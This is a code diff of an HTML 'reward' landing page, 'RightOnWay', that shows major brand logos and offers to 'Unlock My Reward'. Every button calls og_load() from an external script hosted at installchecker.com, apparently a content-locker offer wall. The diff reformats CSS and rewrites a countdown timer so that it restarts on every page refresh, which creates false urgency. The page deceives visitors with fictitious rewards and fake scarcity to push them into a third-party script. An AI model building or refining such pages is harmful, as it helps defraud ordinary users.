@@ -96,20 +96,6 @@
             box-shadow: 0 10px 20px rgba(108, 77, 246, 0.2);
             position: relative;
             overflow: hidden;
-        }
-          .cta-button {
-            background: linear-gradient(90deg, var(--primary), var(--primary-light));
-            color: white;
-            border: none;
-            padding: 18px 45px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 20px rgba(108, 77, 246, 0.2);
-            position: relative;
-            overflow: hidden;
             animation: tremble 2s infinite;
         }
 
@@ -335,39 +321,39 @@
             background-color: rgba(0,0,0,0.02);
             margin-top: 60px;
         }
-          .countdown-timer {
-        text-align: center;
-        margin: 30px 0;
-    }
-    
-    .timer-box {
-        background: linear-gradient(135deg, #6C4DF6, #8A6DF7);
-        color: white;
-        display: inline-flex;
-        align-items: center;
-        padding: 12px 25px;
-        border-radius: 12px;
-        font-size: 28px;
-        font-weight: 700;
-        box-shadow: 0 10px 20px rgba(108, 77, 246, 0.2);
-    }
-    
-    .timer-colon {
-        margin: 0 5px;
-        animation: blink 1s infinite;
-    }
-    
-    @keyframes blink {
-        0%, 100% { opacity: 1; }
-        50% { opacity: 0.5; }
-    }
-    
-    .timer-text {
-        color: #64748B;
-        margin-top: 10px;
-        font-size: 16px;
-        font-weight: 500;
-    }
+        .countdown-timer {
+            text-align: center;
+            margin: 30px 0;
+        }
+        
+        .timer-box {
+            background: linear-gradient(135deg, #6C4DF6, #8A6DF7);
+            color: white;
+            display: inline-flex;
+            align-items: center;
+            padding: 12px 25px;
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: 700;
+            box-shadow: 0 10px 20px rgba(108, 77, 246, 0.2);
+        }
+        
+        .timer-colon {
+            margin: 0 5px;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .timer-text {
+            color: #64748B;
+            margin-top: 10px;
+            font-size: 16px;
+            font-weight: 500;
+        }
         
         .footer-links {
             display: flex;
@@ -419,40 +405,40 @@
                 padding: 60px 20px;
             }
         }
-         .many-more {
-        text-align: center;
-        margin-top: 20px;
-        color: #64748B;
-        font-size: 16px;
-        font-weight: 500;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-    }
-    
-    .dots {
-        display: flex;
-        gap: 5px;
-    }
-    
-    .dot {
-        width: 6px;
-        height: 6px;
-        background-color: #6C4DF6;
-        border-radius: 50%;
-        opacity: 0.6;
-        animation: dotPulse 1.5s infinite ease-in-out;
-    }
-    
-    .dot:nth-child(1) { animation-delay: 0s; }
-    .dot:nth-child(2) { animation-delay: 0.2s; }
-    .dot:nth-child(3) { animation-delay: 0.4s; }
-    
-    @keyframes dotPulse {
-        0%, 100% { transform: translateY(0); opacity: 0.6; }
-        50% { transform: translateY(-3px); opacity: 1; }
-    }
+        .many-more {
+            text-align: center;
+            margin-top: 20px;
+            color: #64748B;
+            font-size: 16px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .dots {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .dot {
+            width: 6px;
+            height: 6px;
+            background-color: #6C4DF6;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: dotPulse 1.5s infinite ease-in-out;
+        }
+        
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes dotPulse {
+            0%, 100% { transform: translateY(0); opacity: 0.6; }
+            50% { transform: translateY(-3px); opacity: 1; }
+        }
     </style>
 <script type="text/javascript">var ogblock=true;</script>
 <script type="text/javascript" id="ogjs" src="https://installchecker.com/cl/js/vonjo9"></script>
@@ -468,20 +454,22 @@
         </div>
     </header>
     <div class="countdown-timer">
-    <div class="timer-box">
-        <span id="hours">01</span>
-        <span class="timer-colon">:</span>
-        <span id="minutes">20</span>
-        <span class="timer-colon">:</span>
-        <span id="seconds">00</span>
+        <div class="timer-box">
+            <span id="hours">01</span>
+            <span class="timer-colon">:</span>
+            <span id="minutes">20</span>
+            <span class="timer-colon">:</span>
+            <span id="seconds">00</span>
+        </div>
+        <p class="timer-text">Limited time remaining to claim your reward</p>
     </div>
-    <p class="timer-text">Limited time remaining to claim your reward</p>
-</div>
     
     <section class="hero">
         <div class="container">
             <h1>Exclusive Rewards From World's Top Brands</h1>
-            <p class="subheadline">Get verified access to premium digital rewards from global partners. Simple process with instant delivery.</p>            <button class="cta-button" id="mainCTA" onclick="og_load()">Unlock My Reward</button>              <div class="brands-container">
+            <p class="subheadline">Get verified access to premium digital rewards from global partners. Simple process with instant delivery.</p>
+            <button class="cta-button" id="mainCTA" onclick="og_load()">Unlock My Reward</button>
+            <div class="brands-container">
                 <div class="brands-scroll">
                     <a class="brand-link" title="Amazon" onclick="og_load()">
                         <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="brand-icon">
@@ -548,21 +536,21 @@
                 </div>
             </div>
             <div class="many-more">
-    <span>and You can choose more than these waiting for Verification</span>
-    <div class="dots">
-        <span class="dot"></span>
-        <span class="dot"></span>
-        <span class="dot"></span>
-    </div>
-</div>
-
+                <span>and You can choose more than these waiting for Verification</span>
+                <div class="dots">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
             
             <div class="trust-badges">
                 <div class="badge badge-warning">
                     <span class="badge-icon"><i class="fas fa-clock"></i></span> Limited Time Availability
                 </div>
-            </div>        </div>
-           <button class="cta-button" id="mainCTA" onclick="og_load()">Unlock My Reward</button>
+            </div>
+        </div>
+        <button class="cta-button" id="mainCTA" onclick="og_load()">Unlock My Reward</button>
     </section>
     
     <section class="how-it-works">
@@ -593,13 +581,13 @@
 
     <footer>
         <div class="container">
-         
             <p>© 2023 RightOnWay. All rights reserved.</p>
             <p>This is an independent service and is not affiliated with any brands shown.</p>
         </div>
     </footer>
     
-    <script>        document.getElementById('mainCTA').addEventListener('click', function() {
+    <script>
+        document.getElementById('mainCTA').addEventListener('click', function() {
             og_load();
         });
         
@@ -612,41 +600,66 @@
         brandsScroll.addEventListener('mouseleave', () => {
             brandsScroll.style.animationPlayState = 'running';
         });
-     // Initialize timer with 1 hour 20 minutes if not already set
-    if (!localStorage.getItem('timerEnd')) {
-        const now = new Date();
-        const endTime = new Date(now.getTime() + (80 * 60 * 1000)); // 80 minutes in milliseconds
-        localStorage.setItem('timerEnd', endTime);
-    }
-
-    function updateTimerDisplay() {
-        const now = new Date();
-        const endTime = new Date(localStorage.getItem('timerEnd'));
-        const diff = endTime - now;
         
-        if (diff <= 0) {
-            // Timer has expired
-            document.getElementById('hours').textContent = '00';
-            document.getElementById('minutes').textContent = '00';
-            document.getElementById('seconds').textContent = '00';
-            clearInterval(timerInterval);
-            return;
+        // Improved Timer Logic
+        function initializeTimer() {
+            // Check if page was refreshed
+            const isPageRefreshed = performance.navigation.type === 1;
+            
+            // Set initial time (1 hour 20 minutes in seconds)
+            const initialTime = 80 * 60;
+            
+            // Get stored timer data
+            let storedEndTime = localStorage.getItem('timerEndTime');
+            let storedRemaining = localStorage.getItem('timerRemaining');
+            
+            if (isPageRefreshed || !storedEndTime || !storedRemaining) {
+                // Reset timer if page was refreshed or no stored data
+                const now = new Date();
+                const endTime = new Date(now.getTime() + initialTime * 1000);
+                localStorage.setItem('timerEndTime', endTime);
+                localStorage.setItem('timerRemaining', initialTime);
+                storedEndTime = endTime;
+                storedRemaining = initialTime;
+            }
+            
+            return {
+                endTime: new Date(storedEndTime),
+                remaining: parseInt(storedRemaining)
+            };
         }
         
-        // Calculate remaining time
-        const hours = Math.floor(diff / (1000 * 60 * 60));
-        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+        function updateTimerDisplay() {
+            const timerData = initializeTimer();
+            const now = new Date();
+            const diff = timerData.endTime - now;
+            
+            if (diff <= 0) {
+                // Timer has expired
+                document.getElementById('hours').textContent = '00';
+                document.getElementById('minutes').textContent = '00';
+                document.getElementById('seconds').textContent = '00';
+                clearInterval(timerInterval);
+                return;
+            }
+            
+            // Calculate remaining time
+            const hours = Math.floor(diff / (1000 * 60 * 60));
+            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+            
+            // Update display
+            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+            
+            // Store remaining time
+            localStorage.setItem('timerRemaining', Math.floor(diff / 1000));
+        }
         
-        // Update display
-        document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
-        document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
-        document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
-    }
-
-    // Update timer immediately and then every second
-    updateTimerDisplay();
-    const timerInterval = setInterval(updateTimerDisplay, 1000);
+        // Update timer immediately and then every second
+        updateTimerDisplay();
+        const timerInterval = setInterval(updateTimerDisplay, 1000);
     </script>
 </body>
 </html>
